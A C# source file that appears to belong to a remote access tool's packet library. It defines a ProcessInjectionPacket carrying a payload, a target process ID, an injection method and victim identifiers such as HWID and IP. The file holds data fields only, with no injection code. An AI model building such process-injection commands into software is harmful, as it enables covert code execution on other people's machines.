using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ProcessInjectionPacket : IPacket
    {
        public enum INJECTION_METHODS : byte
        {
            CLASSIC = 0,
            MAP_VIEW = 1
        }

        //server
        public ProcessInjectionPacket(byte[] payload, INJECTION_METHODS injectionMethod, int processId) : base()
        {
            this.packetType = PacketType.PM_INJECT_PROCESS;

            this.payload = payload;
            this.injectionMethod = injectionMethod;
            this.processId = processId;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public INJECTION_METHODS injectionMethod { get; set; }
        public byte[] payload { get; set; }
        public int processId { get; set; }
    }
}
